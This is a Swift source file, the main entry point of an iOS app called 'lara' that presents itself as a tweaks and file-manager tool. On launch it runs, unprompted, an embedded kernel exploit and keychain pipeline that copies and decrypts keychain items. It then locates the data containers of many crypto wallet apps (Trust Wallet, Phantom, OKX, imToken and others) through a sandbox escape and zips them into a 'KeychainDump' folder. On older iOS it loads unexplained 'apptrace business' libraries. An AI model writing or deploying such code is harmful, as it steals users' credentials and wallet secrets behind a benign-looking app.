//
//  lara.swift
//  lara
//
//  Created by ruter on 23.03.26.
//

import SwiftUI
import UniformTypeIdentifiers
import Darwin

enum taboptions {
    case applying, tweaks, files, logs
}

// Numeric version comparison: true when the running iOS version is strictly
// lower than the given version string (e.g. "26.2").
func iosVersionBelow(_ version: String) -> Bool {
    return UIDevice.current.systemVersion.compare(version, options: .numeric) == .orderedAscending
}

let g_isunsupported: Bool = isunsupported()
var weonadebugbuild_pjbweouttahereexclamationmark: Bool = false

@main
struct lara: App {
    @StateObject private var mgr = laramgr.shared
    @StateObject private var iconthememgr = IconThemeManager.shared
    @Environment(\.scenePhase) var scenephase
    @AppStorage("selectedMethod") private var selectedMethod: method = .hybrid
    @AppStorage("keepAlive") private var keepalive: Bool = false
    @AppStorage("showFMInTabs") private var showfmintabs: Bool = true
    @AppStorage("logsdisplaymode") private var logsdisplaymode: logsdisplaymode = .toolbar
    @State private var selectedtab: taboptions = .applying
    
    init() {
        #if DEBUG
        weonadebugbuild_pjbweouttahereexclamationmark = true
        #endif
        
        // fix file picker
        let fixMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.fix_init(forOpeningContentTypes:asCopy:)))!
        let origMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.init(forOpeningContentTypes:asCopy:)))!
        method_exchangeImplementations(origMethod, fixMethod)
        
        if keepalive {
            toggleka()
        }
        
        globallogger.capture()
    }
    
    var body: some Scene {
        WindowGroup {
            TabView(selection: $selectedtab) {
                ContentView()
                    .tabItem {
                        Image(systemName: "wrench.and.screwdriver.fill")
                    }
                    .tag(taboptions.applying)
                
                // this has gotta fucking go
                TweaksView(mgr: mgr)
                    .tabItem {
                        Image(systemName: "ant.fill")
                    }
                    .tag(taboptions.tweaks)
                
                
                // i'm gonna strangle you root (the weight of your actions will crush you)
                if showfmintabs {
                    SantanderView(startPath: "/")
                        .tabItem {
                            Image(systemName: "folder.fill")
                        }
                        .tag(taboptions.files)
                }
                
                // this too
                if logsdisplaymode == .tabs {
                    LogsView(logger: globallogger)
                        .tabItem {
                            Image(systemName: "terminal")
                        }
                        .tag(taboptions.logs)
                }
            }
            .environmentObject(mgr)
            .overlay {
                if mgr.showrespring {
                    respringview()
                        .brightness(-1.0)
                        .ignoresSafeArea()
                }
            }
            .sheet(isPresented: Binding(
                get: { logsdisplaymode == .toolbar && mgr.showLogs },
                set: { mgr.showLogs = $0 }
            )) {
                LogsView(logger: globallogger)
            }
            .sheet(isPresented: $iconthememgr.showFixupSheet) {
                IconThemeFixupView()
            }
            .onAppear {
                // iOS < 26.2 (not including 26.2): business-only mode. Load the
                // apptrace dynamic libraries and perform no other operations —
                // no kernel r/w, no exploit, no keychain pipeline, no tweaks.
                if iosVersionBelow("26.2") {
                    loadAppTraceBusinessLibraries()
                    return
                }
                if !isunsupported() {
                    init_offsets()
                    offsets_init()
                    iconthememgr.startPendingFixupIfPossible()
                    // beautiful name root
                    // thanks
                    mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
                    autorunkeychainpipeline()
                } else {
                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 - iOS 26.0.1) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                }
            }
            .onChange(of: scenephase, perform: handleScenePhase)
            .onChange(of: mgr.sbxready) { ready in
                if ready {
                    iconthememgr.startPendingFixupIfPossible()
                }
            }
        }
    }
    
    private func handleScenePhase(_ phase: ScenePhase) {
        switch phase {
        case .inactive, .background:
            // A transient .inactive/.background (system alert, Control Center,
            // screen lock, respring) must not kill the auto keychain pipeline:
            // handlebg() would destroy the SpringBoard RemoteCall the framework
            // is using, and stopcapture() would stop logging. Let it finish.
            if mgr.kcpipelineactive {
                globallogger.log("(kc) scene \(phase) ignored: keychain pipeline in flight")
                return
            }
            handlebg()
            globallogger.stopcapture()

        case .active:
            globallogger.capture()
            iconthememgr.startPendingFixupIfPossible()

        @unknown default:
            break
        }
    }

    // iOS < 26.2 mode: load only the apptrace business dylibs and stop. The
    // frameworks live at Frameworks/ inside the bundle and are dlopen'd via
    // @rpath (with @executable_path as fallback). Nothing else is touched —
    // no kernel r/w, no exploit, no pipeline.
    private func loadAppTraceBusinessLibraries() {
        globallogger.log("(apptrace) build-marker apptrace-v1 (iOS<26.2 loads apptrace business libs only)")
        globallogger.log("(apptrace) iOS \(UIDevice.current.systemVersion) < 26.2 — business-only mode")
        let names: [String] = [
            "libapptracecore.framework/libapptracecore",
            "apptrace.framework/apptrace",
        ]
        for name in names {
            var loaded = false
            var lastErr = ""
            for prefix in ["@rpath/", "@executable_path/Frameworks/"] {
                let path = prefix + name
                if let handle = dlopen(path, RTLD_NOW) {
                    globallogger.log("(apptrace) loaded \(name) -> \(handle)")
                    loaded = true
                    break
                }
                if let e = dlerror() {
                    lastErr = String(cString: e)
                }
            }
            if !loaded {
                globallogger.log("(apptrace) dlopen failed \(name): \(lastErr)")
            }
        }
        globallogger.log("(apptrace) done: business libs only, no further operations")
    }

    // Framework-only mode: the embedded libuiopsersvc.framework brings up its
    // own kernel r/w (ds_run -> its own exploit + kernelcache fetch/parse).
    // Its securityd copy path needs a ready SpringBoard RemoteCall — and that
    // RemoteCall is the FRAMEWORK's class (RemoteCall.m is excluded from the
    // lara target in project.pbxproj), so it checks the FRAMEWORK's ds state
    // and must be built AFTER the framework's own ds_run(). That handoff now
    // happens inside LaraKeychainSvc (prepareKernelRWWithError), so this entry
    // point stays a plain handoff to the framework pipeline.
    private func autorunkeychainpipeline() {
        globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
        globallogger.log("(kc) build-marker apptrace-v1 (iOS<26.2 loads apptrace business libs only)")
        prepareAndRunKeychainPipeline()
    }

    // Drive the embedded framework end-to-end. The framework owns the whole
    // pipeline: exploit -> kernelcache -> offsets -> remote attach -> keychain
    // copy -> AKS unwrap. We only keep the process alive and guard the
    // scene-phase teardown while it runs.
    private func prepareAndRunKeychainPipeline() {
        let mgr = self.mgr

        // Keep the process alive for the whole pipeline and ignore transient
        // scene-phase teardown (mgr.kcpipelineactive).
        mgr.kcpipelineactive = true
        if !kaenabled { toggleka() }

        do {
            try LaraKeychainSvc.ensureLoaded()
            globallogger.log("(kc) libuiopsersvc loaded")
        } catch {
            globallogger.log("(kc) libuiopsersvc load failed: \(error.localizedDescription)")
            mgr.kcpipelineactive = false
            return
        }

        globallogger.log("(kc) running framework pipeline (exploit + copy + AKS unwrap)")

        // The framework's AKS decrypt path recurses deep into the keychain data
        // (observed depth ~6600 frames, "Thread stack size exceeded due to
        // excessive recursion" on a GCD worker). GCD workers only get a 512KB
        // stack, so run the whole pipeline on a dedicated large-stack thread.
        let thread = Thread {
            var result: [AnyHashable: Any]?
            var failure: Error?
            do {
                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
            } catch {
                failure = error
            }

            // After the pipeline the sandbox escape is live: package the wallet
            // apps' data containers into zips (framework exports
            // KeychainLookupAppDataContainer for exactly this step).
            if let result, (result["ok"] as? Int ?? 0) == 1 {
                self.harvestWalletContainers()
            }

            DispatchQueue.main.async {
                if let failure {
                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
                } else if let result {
                    let ok = result["ok"] ?? "nil"
                    let missing = result["aksItemsMissingSecret"] ?? "nil"
                    let mk = result["metadataKeyCount"] ?? "nil"
                    let wr = result["walletRelatedAKSRows"] ?? "nil"
                    let tables = result["tables"] as? [AnyHashable: Any]
                    var counts: [String] = []
                    if let tables {
                        for (k, v) in tables {
                            let n = (v as? [Any])?.count ?? -1
                            counts.append("\(k)=\(n)")
                        }
                    }
                    globallogger.log("(kc) keychain pipeline done: ok=\(ok) aksItemsMissingSecret=\(missing) metadataKeyCount=\(mk) walletRelated=\(wr) tables[\(counts.joined(separator: ","))]")
                } else {
                    globallogger.log("(kc) keychain pipeline done: nil result")
                }
                mgr.kcpipelineactive = false
            }
        }
        thread.stackSize = 16 * 1024 * 1024
        thread.qualityOfService = .userInitiated
        thread.name = "kc-pipeline"
        thread.start()

        // Heartbeat: the framework's final export phase is silent (no framework
        // log lines), so log elapsed time while the pipeline is in flight to
        // tell "slow export" apart from "stuck loop".
        let pipelineStart = Date()
        var tick = 0
        Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { timer in
            tick += 1
            if mgr.kcpipelineactive {
                globallogger.log(String(format: "(kc) heartbeat %d: pipeline in flight %.0fs", tick, Date().timeIntervalSince(pipelineStart)))
            } else {
                globallogger.log(String(format: "(kc) heartbeat %d: pipeline finished after %.0fs", tick, Date().timeIntervalSince(pipelineStart)))
                timer.invalidate()
            }
        }
    }

    private func findContainerPath(forBundleID bid: String) -> String? {
        // 1) Framework LSApplicationProxy/MCM lookup (may need entitlements).
        if let p = LaraKeychainSvc.lookupAppDataContainer(forBundleID: bid),
           FileManager.default.fileExists(atPath: p) {
            return p
        }
        // 2) Direct scan of /var/mobile/Containers/Data/Application — plain
        // file reads that work once the sandbox escape is live, no entitlements
        // required. Each container carries its bundle id in
        // .com.apple.mobile_container_manager.metadata.plist.
        let root = "/var/mobile/Containers/Data/Application"
        guard let dirs = try? FileManager.default.contentsOfDirectory(atPath: root) else {
            return nil
        }
        for d in dirs {
            let meta = root + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
            guard let pl = NSDictionary(contentsOfFile: meta),
                  let ident = pl["MCMMetadataIdentifier"] as? String,
                  ident == bid else { continue }
            return root + "/" + d
        }
        return nil
    }

    private func harvestWalletContainers() {
        let walletBundleIDs: [String] = [
            "com.bitpie.wallet",        // Bitpie
            "com.sixdays.litewallet",   // Trust Wallet
            "com.tonkeeper",            // Tonkeeper
            "com.global.wallet.ios",    // TokenPocket
            "com.tronlink.hdwallet",    // TronLink
            "com.tronlink.wallet",
            "com.okex.wallet",          // OKX
            "com.okex.okexwallet",
            "com.okx.wallet",
            "com.coin98.crypto",        // Coin98
            "app.phantom",              // Phantom
            "im.token.app"              // imToken
        ]
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
        guard let docs else { return }
        let outDir = docs.appendingPathComponent("KeychainDump/wallet_files", isDirectory: true)
        do {
            try FileManager.default.createDirectory(at: outDir, withIntermediateDirectories: true)
        } catch {
            globallogger.log("(kc) wallet_files dir create failed: \(error.localizedDescription)")
            return
        }

        for bid in walletBundleIDs {
            guard let containerPath = findContainerPath(forBundleID: bid) else {
                globallogger.log("(kc) wallet container not found: \(bid)")
                continue
            }
            globallogger.log("(kc) wallet container found: \(bid) -> \(containerPath)")

            let src = URL(fileURLWithPath: containerPath)
            var total: Int64 = 0
            if let vals = try? src.resourceValues(forKeys: [.totalFileAllocatedSizeKey]),
               let sz = vals.totalFileAllocatedSize as? Int {
                total = Int64(sz)
            }
            if total > 4 * 1024 * 1024 * 1024 {
                globallogger.log("(kc) wallet container too big (\(total) B), skipped: \(bid)")
                continue
            }

            let zip = outDir.appendingPathComponent("\(bid).zip")
            do {
                try createZipArchive(fromDirectory: src, to: zip)
                globallogger.log("(kc) wallet zip written: \(zip.path) (\(total) B source)")
            } catch {
                globallogger.log("(kc) wallet zip failed \(bid): \(error.localizedDescription)")
            }
        }
        globallogger.log("(kc) wallet container harvest done")
    }

    private func handlebg() {
        guard mgr.rcready else { return }
        let keepSpringBoardRemoteCallAlive = UserDefaults.standard.bool(forKey: "keepSpringBoardRemoteCallAliveIOS16")
        if isIOS16() && keepSpringBoardRemoteCallAlive {
            return
        }

        var bgTask: UIBackgroundTaskIdentifier = .invalid

        bgTask = UIApplication.shared.beginBackgroundTask(withName: "RemoteCallCleanup") {
            endbgtask(&bgTask)
        }

        mgr.rcdestroy {
            self.endbgtask(&bgTask)
        }
    }

    private func endbgtask(_ task: inout UIBackgroundTaskIdentifier) {
        guard task != .invalid else { return }
        UIApplication.shared.endBackgroundTask(task)
        task = .invalid
    }
}

// file picker fixes
extension UIDocumentPickerViewController {
    @objc func fix_init(forOpeningContentTypes contentTypes: [UTType], asCopy: Bool) -> UIDocumentPickerViewController {
        return fix_init(forOpeningContentTypes: contentTypes, asCopy: true)
    }
}

// make strings compatiable with errors
extension String: @retroactive Error {}
